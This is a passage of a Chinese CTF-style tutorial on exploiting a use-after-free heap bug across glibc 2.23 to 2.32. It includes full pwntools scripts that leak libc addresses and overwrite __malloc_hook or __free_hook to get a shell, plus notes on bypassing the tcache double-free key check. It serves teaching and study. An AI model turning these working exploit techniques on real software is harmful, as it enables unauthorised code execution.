bin大小的堆块，利用UAF+binary的show功能来泄露libc的基地址，再通过uaf申请满足fastbin大小的chunk，并修改其fd指针，将__malloc_hook周围满足检查的地址链到fastbin中，再次申请相同大小的chunk即可将其取出，修改为one_gadget即可getshell。</p><p>​    修改__malloc_hook的原因是在__libc_malloc中会先于分配过程检查__malloc_hook是否为空，若不为空则调用。__malloc_hook在首次malloc的时候会用作初始化相关的工作来使用，往后其值为0，因为在从fastbin中取chunk的过程中会检查size是否合法，所以要在__malloc_hook周围找出一块合法的地址，经验来说，在__malloc_hook - 0x23的位置处有一个合法的size位，可以用来伪造chunk。</p><p><img src="https://i.loli.net/2021/05/18/PyaVxfZnKAY7mNk.png" style="zoom:50%;" /></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>​    泄露LIBC地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># 申请0x10防止在free 0x100的时候该chunk与top chunk合并</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里也可以不用申请一个chunk，毕竟有UAF，可以直接show</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">344</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure><p>​    fastbin attack</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 申请0x60的chunk可以来对应到__malloc_hook-0x23处的size</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 修改fastbin的fd指针</span></span><br><span class="line">edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">og = libc_base + <span class="number">0xd5bf7</span></span><br><span class="line"><span class="comment"># 申请到__malloc_hook - 0x23，覆写hook的值为one_gadget</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="number">0x13</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/18/ocSeuN2OasW7Tjn.png" style="zoom:50%;" /></p><p>​    完整exp如下仅供参考，由于整个程序在堆块编辑的过程中限制很宽松，大家可以自己写出更多种exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.23&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">344</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== FASTBIN ATTACK =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">og = libc_base + <span class="number">0xd5bf7</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="number">0x13</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TRIGGER MALLOC HOOK =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h2><p>​    libc2.27在更新后，malloc源码发生了变化，基本上和libc2.31的源码一样，引入了key指针来避免double free，所以我们在2.27下的利用手法和2.31下的利用手法基本一致，直接篡改key指针即可绕过检查。</p><p>​    在老版libc下关于tcache的俩结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>​    从tcache中拿堆块的函数tcache_get()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    free后放入tcache中的函数tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    tcache bin和fastbin的管理方式很像，都采用FILO的单链表（理解为数据结构中的栈），但是tcache的优先级更高，并且在bin中，fastbin的fd指针指向上一个chunk的头部，而tcache会指向上一个chunk的数据部分。</p><p>​    旧版libc2.27中，tcache结构体没有引入key指针，可以随意double free，在UAF下，使得利用手法更为容易，并且在分配的过程中没有对size进行检查，所以在旧版libc2.27下很常见的一种利用手法就是填满tcache后，申请unsorted bin大小的chunk利用UAF进行地址泄露，利用tcache随意double free的特性来修改__free_hook指针为one<em>gadget，原理同\</em>_malloc_hook。</p><p>​    现在比赛中涉及libc2.27的一般都会换上新版的libc，新版libc2.27的部分我们到2.31处再进行讨论。</p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="利用手法-1"><a href="#利用手法-1" class="headerlink" title="利用手法"></a>利用手法</h3><p>​    在libc2.31中，我们查看tcache的相关结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="comment">// 新引入了key指针</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">// 这个位置很有趣，在libc2.27中的数据结构是char一个字节，libc2.31被更新为uint16_t类型为2个字节了</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>​    从tcache中拿堆块的函数tcache_get()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="comment">// 取出时将key字段设置为NULL</span></span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    free后放入tcache中的函数tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    key字段用于检测是否存在double free，在_int_free中有这样一段代码来检测tcache中的double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>​    这段代码的意思就是如果key值等于tcache的地址，那么就进入tcache的链表，然后后移，判断当前堆块是否在链表中，如果在链表中，那么很显然就是double free了。绕过方法很简单，利用漏洞改掉key值即可，直接给干掉if判断了，就不会进入这个if分支了。</p><p>​    在UAF下的利用手法为首先填满tcache，然后申请unsorted bin大小的chunk，利用UAF泄露libc基址，最后通过修改tcache的指针轻松的将堆块申请到__free_hook，修改为system地址，然后free一个chunk，chunk的内容为”/bin/sh\x00”即可轻松getshell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>​    泄露libc地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protected&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">138</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure><p>​    修改next指针为__free_hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ========================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>​    完整exp如下仅供参考，由于整个程序在堆块编辑的过程中限制很宽松，大家可以自己写出更多种exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.31&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protected&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">138</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​    最后谈一下libc2.27和libc2.31的一些小tips，当我们攻击tcache_perthread_struct时，很常见的一个做法就是来将其记录counts的区域全部覆盖填满，这样我们再次申请的chunk可逃逸出tcache，在libc2.27中counts[TCACHE_MAX_BINS]的类型为char，即在相应size的位置上记录数量的大小是一个字节，而在libc2.31中相应的类型为uint16_t，大小是两个字节，所以我们之前的payload通常是<code>b&quot;\x07&quot; * 0x40</code>（从trcache_perthread_struct的数据区开始填充），在libc2.31中，payload需要改写成<code>b&quot;\x07&quot; * 0x80</code>，因为大小多了一倍，也相应的需要增加padding。</p><p><img src="https://i.loli.net/2021/05/18/bVhP95jX3nJzpQk.png" alt=""></p><h2 id="2-32"><a href="#2-32" class="headerlink" title="2.32"></a>2.32</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li><p>源码下载</p><p><a href="https://ftp.gnu.org/gnu/glibc/">https://ftp.gnu.org/gnu/glibc/</a></p></li></ul><p>下载好源码后新建一个文件夹用于存放源码</p><p>新建一个文件夹用于存放编译后的libc</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /glibc/glibc-2.32_src/       # 源码在这</span><br><span class="line">sudo mkdir build</span><br><span class="line">cd build </span><br><span class="line">CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span><br><span class="line">CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span><br><span class="line">sudo ../configure --prefix=/glibc/2.32/# 存放编译后的libc</span><br></pre></td></tr></table></figure><p>​    若想调试malloc和free的过程，进入gdb后<code>directory /glibc/glibc-2.32_src/malloc/</code>，其中第二个位置填我们下载的glibc源码路径。</p><p>​    记得binary程序需要使用patchelf修改ld加载器和libc</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /glibc/2.32/lib/ld-2.32.so</span><br><span class="line">LD_PRELOAD=/glibc/2.32/lib/libc-2.32.so ./binary</span><br></pre></td></tr></table></figure><h3 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h3><p>​    我们简单写一个malloc和free的demo示例程序，使用gdb来调试malloc和free的过程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* p[<span class="number">20</span>];</span><br><span class="line">p[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">p[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(p[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(p[<span class="number">1</span>]);</span><br><span class="line">p[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In file: /home/lemon/Documents/pwn/UAF/2.32/tcache_32.c</span><br><span class="line">    3 int main()</span><br><span class="line">    4 &#123;</span><br><span class="line">    5 void* p[20];</span><br><span class="line">    6 p[0] = malloc(0x80);</span><br><span class="line">    7 p[1] = malloc(0x80);</span><br><span class="line"> ►  8 free(p[0]);</span><br><span class="line">    9 free(p[1]);</span><br><span class="line">   10 p[2] = malloc(0x80);</span><br><span class="line">   11 &#125;</span><br></pre></td></tr></table></figure><h4 id="free过程"><a href="#free过程" class="headerlink" title="free过程"></a>free过程</h4><p>​    我们定位到第八行后，按s步入free的过程</p><p><img src="https://i.loli.net/2021/05/18/qeVOXbG4sAl7h9j.png" alt=""></p><p>​    一直走到_int_free函数，步入此函数</p><p><img src="https://i.loli.net/2021/05/18/yLlNk7QcovAWqhJ.png" alt=""></p><p>​    向后运行，准备调用tcache_put函数将当前准备free的chunk放入tcache结构体中</p><p><img src="https://i.loli.net/2021/05/18/uNDrFyIVwe9odXG.png" alt=""></p><p>​    tcache相关的结构体如下，可以发现其实相对于libc-2.31的代码tcache结构体没有发生变化</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk 